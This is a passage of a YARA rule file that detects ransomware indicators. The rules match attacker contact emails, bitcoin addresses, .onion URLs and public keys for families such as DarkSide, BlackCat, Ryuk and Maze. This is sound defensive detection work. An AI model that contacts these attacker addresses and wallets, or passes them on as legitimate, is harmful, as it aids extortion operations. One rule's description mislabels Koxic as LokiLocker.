		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "163694ed2ae181764fc6e62027487d183114be35a689dd44d4d9761149df244b"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "neftet@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Thanos_2
{
	meta:
		description = "Detects files referencing identities associated with Thanos ransomware"
		author = "ditekShen"
		id = "22ffb4c9-f113-5d3e-a466-6c384c0c6e8a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L173-L182"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "039ea384136a1aaa261702ed75ab9358aaa1ec2d5a8d35fe4789647f39490c7c"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "my-contact-email@protonmail.com" ascii wide nocase
		$s2 = "get-my-data@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Vovalex_2
{
	meta:
		description = "Detects files referencing identities associated with Vovalex ransomware"
		author = "ditekShen"
		id = "95e9ddce-8a19-59f1-baf4-bdac61c9c396"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L184-L192"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e8b426e55c1efaf59e5f255f1da9cdfbb509561d3f7ea5baa2815c3131866eb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "vovanandlexus@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alumnilocker_2
{
	meta:
		description = "Detects files referencing identities associated with AlumniLocker ransomware"
		author = "ditekShen"
		id = "64b6aff8-3758-5837-b814-e2505a9c12a3"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L194-L202"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "aeab9cb2b2da246e1863cd1102d901d322017d0b309e852d83e4f66f6e4bdd22"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "alumnilocker@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Doejocrypt_2
{
	meta:
		description = "Detects files referencing identities associated with DoejoCrypt ransomware"
		author = "ditekShen"
		id = "bdf67fd3-8614-52f0-8804-9905f067a848"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L204-L213"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b76996ef413d017fa571115f7331154c808fed0f1b1e0c97241cadbbef260a00"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "konedieyp@airmail.cc" ascii wide nocase
		$s2 = "uenwonken@memail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Purge_2
{
	meta:
		description = "Detects files referencing identities associated with Purge ransomware"
		author = "ditekShen"
		id = "2a0f2c69-b179-5e48-9db6-be25e329f72b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L215-L224"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "49f3f5a88212d4bed1f0237a4437fb537e84cd6dd26c5fe224250f3b6e39d384"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "rscl@dr.com" ascii wide nocase
		$s2 = "rscl@usa.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Zeoticus_2
{
	meta:
		description = "Detects files referencing identities associated with Zeoticus ransomware"
		author = "ditekShen"
		id = "4d5f0d6d-f792-563d-9a9b-1986f5af8743"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L226-L235"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7a83b15b0c8e81f67d11f8b5d9a43ba4e1e3a0f6741ddd0daafe4e742dd91cd8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "anobtanium@tutanota.com" ascii wide nocase
		$s2 = "anobtanium@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Unlockyourfiles_2
{
	meta:
		description = "Detects files referencing identities associated with UnlockYourFiles ransomware"
		author = "ditekShen"
		id = "fdc3ec49-66cc-5a0b-87a6-3660dd6f3b72"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L279-L288"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a33dae7f08eb0c2415fbfdadf2cbbf90c68bc802352277422c6d0a2dbd62cd82"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "4lok3r@tutanota.com" ascii wide nocase
		$s2 = "4lok3r@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Darkside_2
{
	meta:
		description = "Detects files referencing identities associated with DarkSide ransomware"
		author = "ditekShen"
		id = "7b29b9b9-4657-551e-b770-880a2278ef60"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L290-L299"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3c6cdb15cad19f1db38c0fe03ecb24d5cd4861a699aa2bee0f99b8dddacc8bd1"
		score = 75
		quality = 73
		tags = ""
		hash1 = "bafa2efff234303166d663f967037dae43701e7d63d914efc8c894b3e5be9408"

	strings:
		$s1 = "breathcojunktab1987@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Spyro_2
{
	meta:
		description = "Detects files referencing identities associated with Spyro ransomware"
		author = "ditekShen"
		id = "9a42a9fd-dfaf-5719-acae-e7c3b92ecdc9"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L301-L310"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b12b24b7b1b9800d249fd322532d957ddfc020c495ca89414d8d7e9fa7d58eb7"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "blackspyro@tutanota.com" ascii wide nocase
		$s2 = "blackspyro@mailfence.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryzerlo_2
{
	meta:
		description = "Detects files referencing identities associated with Ryzerlo / HiddenTear / RSJON ransomware"
		author = "ditekShen"
		id = "1e8b79dc-4a81-5126-a7a3-ad7a2e8f62bf"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L312-L320"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2d925cac74411c3e408d674e27a27ae029d39977026a79df8f90edae345a31db"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "darkjon@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ranzylocker_2
{
	meta:
		description = "Detects files referencing identities associated with RanzyLocker ransomware"
		author = "ditekShen"
		id = "33478dc4-c0ec-5cc8-8620-79e770f6a773"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L354-L363"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dc345257a3cca82a95e20505c94e90d8ac42240e1491ea1f34be121871673e26"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "eviluser@tutanota.com" ascii wide nocase
		$s2 = "evilpr0ton@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alkhal_2
{
	meta:
		description = "Detects files referencing identities associated with AlKhal ransomware"
		author = "ditekShen"
		id = "32e14a6e-fc2e-5c0a-b8e3-33e219923d90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L365-L374"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd2d66a9cd33ab15b451158cd6c0e6579735653611ee2e6c8045a5807091938d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "alkhal@tutanota.com" ascii wide nocase
		$s2 = "cyrilga@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rapid_2
{
	meta:
		description = "Detects files referencing identities associated with Rapid ransomware"
		author = "ditekShen"
		id = "a1c6f3c0-2fec-5d96-9965-8129a843ae90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L428-L436"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ea82a3fcb1d836e1c250e9a576064e1babdb82b4970555260af2eb68726cfd16"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "jimmyneytron@tuta.io" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Satana_2
{
	meta:
		description = "Detects files referencing identities associated with Satana ransomware"
		author = "ditekShen"
		id = "a362d4ca-d475-5392-a3ac-45337425d8e7"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L438-L447"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6d82e2497044518cee1b56da85f1ad6ac7934eec9ca68501932d55add4236d45"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "adamadam@ausi.com" ascii wide nocase
		$s2 = "XsrR2he2Z8un5ysGWnJ1wveZRPRS96XEoX" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Diavol_2
{
	meta:
		description = "Detects files referencing identities associated with Diavol ransomware"
		author = "ditekShen"
		id = "ea499318-ed5b-5597-8f9f-4ece7942cf4b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L482-L491"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c72f4d7854f7ba813c4872d47aad69edb8c2927f380b9213ced1aca52454eee5"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "/noino.5fws6uqv5byttg2r//:sptth" ascii wide nocase
		$s2 = "https://r2gttyb5vqu6swf5.onion/" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Maze_2
{
	meta:
		description = "Detects files referencing identities associated with Maze ransomware"
		author = "ditekShen"
		id = "7cc11912-e5d2-5477-ab9b-0c470bb5e1d6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L513-L521"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "46070d46c502837e5fb87d0fb75244a1a21e90b4e0ce4b73c408b8dc67fe1bcb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "getmyfilesback@airmail.cc" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lokilocker_2
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "ab2cf390-4544-54ed-913c-d463d0f1bdb0"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L523-L531"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1ab9a2ce7e39d916b389e2adb975e3558ddb7d87f7e9494e6b20cb25edd3cb84"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "Unlockpls.dr01@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Blackcat_2
{
	meta:
		description = "Detects files referencing identities associated with BlackCat ransomware"
		author = "ditekShen"
		id = "21038f8e-73cd-59d2-9eb3-6947d263ab79"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L533-L569"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "eb0a4d26170f030775f778cc524749ca283dfa983f84bd364e4df6321eb96cf1"
		score = 75
		quality = 73
		tags = ""

	strings:
		$pk1 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0B0ni9tyKHSJmU6gc1iRwNTklYocRKmLPUyOthUIHnZHwL1M2pKlMBwXx81bboVS6Cf8YaCoWW1bCmLwPX421sG22xkmtMy/SfiG8jaYtYiA7r7hOdIUnJgRo6vDvNafZlSD32tFVVjuX8Ec79qj2FM7/MmNcseUgpIQaEACuZcSzMK+jZA4BLT9b5Akkec2hPOXGTPmgaXjL9EJE+0rhNZcm/m6xe4/S5eL2kSCVsNUeG8xWuSO2kDRS8xY3rtJOCNEdqZp1rxzTkhgj3hHqr7AoFAkxNblQ538JcdF5+CGINxckA/ldmP7wQd92tmFk2vcl2WeQykFwMM6L6MsQwIDAQAB" ascii wide
		$pk2 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA49gzJwP9UwEuYQZT1cdgSpxG6z8TVNLPfS4Qwd3vpWHEOAuvi8JGVEpHPGZnrD1QFoDLSTva3PZ4mqtIVO79GOYb5uQkP7LdJGWbLAjUGptVGmB67jKOOLLrjmuBDHpJXSOGG/vw5vajr4MhNnsvoBLPOC0AOzPM6GBDgKdC9zdUGNEreAjOR4neqwZ2jfYl5k5e3eRF86hmWhGXJQaU1uTmDJwgQIzmUZKo+YCfAHbEbSA4HhsumJfw0MJN7RfKPEQkEVvRIBibHnJuIp1bxk3IGPzTCbyQLHMVLz8wgElEexu8/aO3FT6w4uPY3qD+r2W+ri7xIdEN/pTz6TBKvwIDAQAB" ascii wide
		$pk3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8tKPNFCbU5Unr9jxlTk4RmUdVhcRydJFts6hMpLzcAXIR2yxiNC0QiF4UovAIpGwX6kxOW7kOaOvABJQP6QENMNSg030VlLoTP+ndfFwIt+X+RUflG4UWPE8yu+kzGpCwp7UjX+hD/SpFbSFRRh3BvL3vEq04DzE0AzifEBE4yxKpLsrMsXyZzWy9Nza8NTO2jrBxoEVM2xCLkULp0wZEPDwgeKGkoxMzqavVWBC+Vxi0atKstbo7/TloNenPagl/eUErk9C8tT67zKgbEh3TFtREgaxa/yrjBvN48BU8JGGxLxy4AeGF0vOUdD0WkJsWYzLVg21ApgJaCDr5zDPuQIDAQAB" ascii wide
		$pk4 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApw3tWdMaWJvNf2Mejy5H0Y6kuj+lstNpwFyismGDEYhWKPps9c68xl+84o6uLKfqPzNvLnSxlVa6DitcJGeKJEQkzN+C1e1KsfzM63jHybREB2hs+dHbqBq4dbamIQcTrrr4mKzuHJ7aok4mlpRx2Un1XOJaodoV7xOHO7ui5v6uK39MJ3rvitSEBvv5oI0WDlp3IFmtd6UM6r2nygY1ncAUuasalZgF1Vaz7VXOWyX2ReQHbYWWRCR1qyKMQcBtjT5POXx9B8ek1pnU4p65kGe9M794Bhhh20GN24gY5a+zwXwstaNTO9luwd4xjjRQAVsDgjrjkzti27G11ICn6wIDAQAB" ascii wide
		$pk5 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq8kj5LQJngPsY7AhTaJsUXc5FrSGeKS5gw5PIqk2QPM9TY6+us8TRRzWZ7rGk1zns2klpzpRMUzLIqB8lpCkJjqkOUGfgqs+HN4VIOpoJgFY897xstJCxTc+8pYQEsSqClxJllscU0okkLSQqndIR2Gznlg3qfcwyncJAFBInyqM+L4kbwCQZ6x5HNiLe2lJn8RP2aDiMI+RS1uLYron2G7rxDTUQnxThMtgLAeko8ulaB3TpB0g4lmHCenkEZeBNs81986+MjHnv7KkiscZ7ZrezKjNaIxRs8BAcD9y+Q9QQxCvZMS01ITNXcgiItbA4dsGq1fPJ42yBkkiIodsEQIDAQAB" ascii wide
		$pk6 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEoytNrMZRoqyIsFpcjiqVWpuV+cC9jS1umXNg/AnJF/xE7LONAmb1p8Dsx1igIUd65IXfFUxmJjFO5hf8LIBzvjUbBll4lbSgGTAUHa3Jbmr/imle6QftmY32J7dDb4WuJUOx+vLNT0I72CESiyotSzwgvLwjyubTmzTJMkqviYOcgDj45NVOx669cG6FWEaJo3PUZzRx9LS6pkOn8tW+W4NzmHMcrma+LOakan7NU6Khv5Hf5ARNsAA+KvDfP1WXJ/VsLXj6x8SdX0v2iS+y58ehUUmlxc8HNsYdOGFwrwYX9zLyJDedsbPg02c4AE4KXt8vH4+j4lVFtruSy4vwIDAQAB" ascii wide
		$pk7 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9uYkHzaizNXg/S11ncTTLybkMtqrKW8gg6TyzbGWnRNROl9O+l1VZBLG0xiMt1mZbuStl8Lt3l1vlkMa92kgLjN+UfKmq3KhBEheN2uMmR0WpwV83kceVRmzr5lug4RyQ/xA6/OXK4NptDIT4L6CUTBWMyk2mmY0Cq9HyyrjdnHeAXWAcQGFEac7W4jTjONZqI+lgScPewS+cPFnz1hAD0IAqzj5X2mZVSfFGR3tDoIe42jw5wb6W2yi8zb3mgKrGtTBbw0Ppj0UgKrmdN5iFmfUQHLEzKAakDggLcBtrW1o5+4WMaZOLw8maU5byvjXu3F3i3GdQe8SKTYcVK5OQIDAQAB" ascii wide
		$pk8 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAugqZ4ATE9+9FqununW/DBvGosnUX/bNxQzMYUmE14GJIbNa6vwYSNXOlG09mvdAqZqD3lXihWDjy25+gzqSeS+Fs2qNyTdfGPA8iu2xx5RRUXKLGFThxtIzg3fohAK3+LxJVhxtuITAT38IHacc7dVLHsrddu4UDjiHGFdvXjB55Nwe5cu1BYylHsARMYycBA2FwLP57cKvc2/C3OXBAF6qbsVXBcyFhrKOOYA/+5IjFfEhgHy2FLHRf8lmPQPbSlrM6dk+W4D5KVqOPx/eFp0geUJJlmlre3flI29qWS20bkGqAEz9j07y69HGYN9Nt7+DRgBwrpNo/EkZkuaSTtQIDAQAB" ascii wide
		$pk9 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuuAQlnowSGaSi2XgnwaHQAFZ6e7C0SwpAyyLTncJ4l5cwFbM+mwnV+iV3a+ert8WqOmW1aKOCjTPXrXNoirQgboVpLfhIIT1uOOss4O8lodRxgB6QrLCI7PYMZ+8VgIdEPPzsjmTFLxFc7DERxnSjhGdRQIjZNjm7bGScJD0MayDL9KTkVdJtC+C9n5dwEwg6XtQbwLDeaGZaByOgB/zR6tlcPQCNU9rj1qfcVrI/dFW4br/NnJbqrH714z+dvCa18IJTcu3kW74CAilvHrl5qFDd8CCQhjLrjQDPxAoCba9aXKr6dwt34/MU0tVRTYjzMAxR4yTh3oEjVT+HifvVwIDAQAB" ascii wide
		$pk10 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcPjnPl8bI1A0iudX70FKkTjnLjHyetHN2kAIcyOG10K8vm67n/Ma9mAnoDggD3D6UtAbwjvHwPW1m9WF+MrnBXmBizE0JpwOLtVFcHeVLJXlYn/C5RNZziTCwjauH6TlT7Mo/oHfg7nX4IXEuaeAZz8g9ioeJ1Lydi9ZZM1gmdNk8KuKR0zrrJ6MMAGrhMtblLFVwtMn7IlNjT/BgSL4pDyNa++wI5P4R2rMykJwGu/7o2kKE2IFimtFDyZ5a+CX46cdKt7uo5eKFiqf/jTes9/y5AgoS69mt4fRvWFhP7qHXRO2gG8XAc+9suhiuVUWZTAu3xXz5VsmBtk8pzcpwIDAQAB" ascii wide
		$pk11 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwMQXFMtYf60KrbUVwNVoPhhrCTNMY3Zv+/WULZRZfJ4dMhYozDxtRVdtBDKtuYuHCGLu/Ymf9wKFFXgVH3En7qI1sU2UdjNR4086X8oSTMUn/GwEAEIZAHtSFuk6AXcXW+eO0yxPF+lt5AZcNnJocWBVZ8RWGvsQdtGgtZalttAynROC4RUGkvD1h1ssMteHWneFLpfzSPGlbu0s0cemsrTPmhexGIenup/YjNdmhbfvvYE9kZfPebGtZHw6oQXWcG7sAlvkGciJl3Eo9FznNj0K+v8WQW5L/UbosZaYVJbxlbtySvqUqZbkLKsmp91tr9bvTiDMZuXZS7iHVqchUQIDAQAB" ascii wide
		$pk12 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxbKVxwYe4PpnPm0XtuqShDqFWCFRBw0tYo2vmLwVPlwa+0+ox8+nF0mzWC3ZZT2XkGSodszosOoocfKAwOjQnA+4/Hokl4hgG6K8O7wWuWlvgo4fkcZShy2cMY9FaC6e4bMfurlDFt7OVrKKWAyEGv49Etq6LNoyl5ddM/XmspG52gscRoIcOTwBL4bD8nVcamZXqE4j2mS62HicQ6q9YgRVs1PLbgVPbg8c2rFzpN1e8wZdPtvyGON0m3CmxsYa63yianbnBAS4WnxEnoI7eCZZNkblr+kZB4J9War5VYHu9lFw4XWeuHget/Rn8oGCJOMHkZMz23NpUVaX9htQAwIDAQAB" ascii wide
		$url1 = "://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd.onion" ascii wide
		$url2 = "://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion" ascii wide
		$url3 = "://2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid.onion" ascii wide
		$url4 = "://aoczppoxmfqqthtwlwi4fmzlrv6aor3isn6ffaiic55wrfumxslx3vyd.onion" ascii wide
		$url5 = "://b4twqa2mvob3s6uvuyfra5xk3qgps2v5kkt7k2qnb7rpdu3j4fkntead.onion" ascii wide
		$url6 = "://b6v4ojs7jfvftvcoagjxp7qz33yeljydqy6afzsh26vqbzcjwz4b3zad.onion" ascii wide
		$url7 = "://htnpafzbvddr2llstwbjouupddflqm7y7cr7tcchbeo6rmxpqoxcbqqd.onion" ascii wide
		$url8 = "://id7seexjn4bojn5rvo4lwcjgufjz7gkisaidckaux3uvjc7l7xrsiqad.onion" ascii wide
		$url9 = "://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion" ascii wide
		$url10 = "://odf3dt34tkqndw5h2l5gt2gwwd3jct5rwwjusbd3vlin2jueyv2qkgid.onion" ascii wide
		$url11 = "://rfosusl6qdm4zhoqbqnjxaloprld2qz35u77h4aap46rhwkouejsooqd.onion" ascii wide
		$url12 = "://sty5r4hhb5oihbq2mwevrofdiqbgesi66rvxr5sr573xgvtuvr4cs5yd.onion" ascii wide
		$url13 = "://xqoykemmcivwtpxh3a6pu3w7sstr2y7hapxdiv4caaxidurmwwbjx2id.onion" ascii wide
		$url14 = "://y4722ss64vel5hmph75te7lx2x5xz463322ypjirm5ytxviijtdpybid.onion" ascii wide

	condition:
		(1 of ( $pk* ) and 1 of ( $url* ) )
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Koxic_2
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "4c4ff722-cac1-5967-9e79-681f47566e96"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L571-L580"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ca4d0e85cf4c7a134609262e21d5cef98100ba0a046d17ffe51bf3975dc7cae9"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "wilhelmkox@tutanota.com" ascii wide nocase
		$s2 = "F3C777D22A0686055A3558917315676D607026B680DA5C8D3D4D887017A2A844F546AE59F59F" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryuk_2
{
	meta:
		description = "Detects files referencing identities associated with Ryuk ransomware"
		author = "ditekShen"
		id = "00cf99da-ff3c-5c91-8966-69a8afc8613a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L582-L592"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a2b6106fc49dd254ca936e285fa0c2a3aee7110832686638d20d369d77f6c48f"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "WayneEvenson@protonmail.com" ascii wide nocase
		$s2 = "WayneEvenson@tutanota.com" ascii wide nocase
		$s3 = "14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lockdown_2
{
	meta:
		description = "Detects files referencing identities associated with LockDown / cantopen ransomware"
		author = "ditekShen"
		id = "603f0113-d77b-590c-b2a0-804c6d1fbfbc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L594-L603"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cb17bb92d6e8189a08508481b75d301a1227906815c684753859914d77d7b3e7"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "CCWhite@onionmail.org" ascii wide nocase
		$s2 = "bc1q6ug0vrxz66d564qznclu9yyyvn6zurskezmt64" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Powershellcookiestealer_2
{
